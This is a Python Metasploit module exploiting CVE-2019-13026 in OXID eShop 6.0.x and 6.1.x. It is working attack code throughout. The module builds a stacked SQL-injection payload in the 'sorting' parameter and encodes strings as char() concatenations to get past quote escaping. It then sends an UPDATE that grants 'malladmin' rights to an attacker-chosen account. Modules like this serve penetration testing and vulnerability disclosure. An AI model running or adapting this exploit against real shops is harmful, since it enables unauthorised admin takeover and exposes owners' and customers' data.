#!/usr/bin/env python
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'OXID admin privilege elevation',
    'description': '''
        Module for CVE-2019-13026.
        The OXID e-commerce web shop version:
        * OXID eShop EE, PE and CE v6.0.0 – v6.0.4
        * OXID eShop EE, PE and CE v6.1.0 – v6.1.3
        performs improper input validation for the article order parameter "sorting".
        This allows the execution of arbitrary SQL commands.
        This module uses this SQLi vulnerability to assign admin back end privileges to an arbitrary user.
    ''',
    'authors': [
        'Timo Müller, work@mtimo.de'
    ],
    'date': '2019-08-04',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2019-13026'},
        {'type': 'url', 'ref': 'https://oxidforge.org/en/security-bulletin-2019-001.html'},
        {'type': 'url', 'ref': 'https://blog.ripstech.com/2019/oxid-esales-shop-software/'},
        {'type': 'aka', 'ref': 'Ripstech, vulnerability discovery'}
    ],
    # 'type': 'remote_exploit',
    'type': 'single_scanner',
    'options': {
        'targeturi': {'type': 'string', 'description': 'The path to a detailed item description',
                      'required': True, 'default': '/en/Wakeboarding/Bindings/Binding-O-BRIEN-DECADE-CT-2010.html'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'scheme': {'type': 'string', 'description': 'Target address', 'required': True, 'default': "http"},
        'email': {'type': 'string', 'description': 'The email address of the OXID user which should gain admin privileges',
                  'required': True, 'default': None},
        'verify_ssl': {'type': 'bool', 'description': 'Perform SSL certificate check', 'required': True, 'default': False},
        'sqli_prefix': {'type': 'string', 'description': 'Sorting prefix for the stacked SQL command', 'required': True, 'default': "oxvarminprice|desc;"},
    }
}


def send_exploit(url, payload, verify_ssl):
    try:
        # Send out the exploit
        response = requests.post(url, data=payload, verify=verify_ssl)
    except requests.exceptions.RequestException as e:
        module.log('{}'.format(e), level="error")
        return

    response_code = response.status_code
    # If we get a HTTP 200 everything should hopefully have worked out
    # This is not a perfect check, but should be good enough
    if response.status_code == 200:
        module.log("Exploit HTTP response code: {}".format(response_code), level="good")
    else:
        module.log("Response code {}. Module most likely failed".format(response_code), level="error")


def generate_mysql_str(s):
    '''
    Because OXID escapes quotes it is required to concatenate strings.
    This function iterates over the parameter string
    and generates the Unicode code point of any given character

    When OXID executes the SQL payload it calculates the Unicode code points back to chars,
    concatenates them. This way we are able to submit strings without using quotes in the payload.
    '''
    result = 'concat('
    for c in s:
        result += 'char({}),'.format(ord(c))
    result = result[:-1]
    result += ')'
    return result


def generate_payload(email, sqli_prefix):
    '''
    Generate the SQLi payload URL parameter
    OXID calls explode('|') on the sorting URL parameter. The first part is "escaped",
    the SQLi can be included in the second part.
    (The affected OXID SQL statement allows stacked SQL)
    '''
    parameter_prefix = 'oxvarminprice|desc;'  # The first part of the prefix is the sorting column name
    parameter_suffix = ';--'

    payload_username = generate_mysql_str(email)
    payload_userrights = generate_mysql_str("malladmin")  # Admins have "malladmin" set in the DB

    # Stitch together and return the payload
    parameter_payload = parameter_prefix
    #  Set "malladmin" on the admin column on our supplied user
    parameter_payload += 'UPDATE oxuser SET OXRIGHTS={oxrights} WHERE oxusername={oxusername};'.format(
        oxrights=payload_userrights, oxusername=payload_username)
    parameter_payload += parameter_suffix
    payload = {
        'sorting': parameter_payload, }
    return payload


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        module.log('Module dependency (requests) is missing, cannot continue', level="error")
        return

    try:
        # Generate payload
        email = args['email']
        sqli_prefix = args['sqli_prefix']
        payload = generate_payload(email, sqli_prefix)

        # Send out exploit
        url = args['scheme'] + "://" + args['rhost'] + args['targeturi']
        verify_ssl = args['verify_ssl']
        send_exploit(url, payload, verify_ssl)
    except Exception as e:
        module.log('{}'.format(e), level="error")
        return


if __name__ == '__main__':
    module.run(metadata, run)
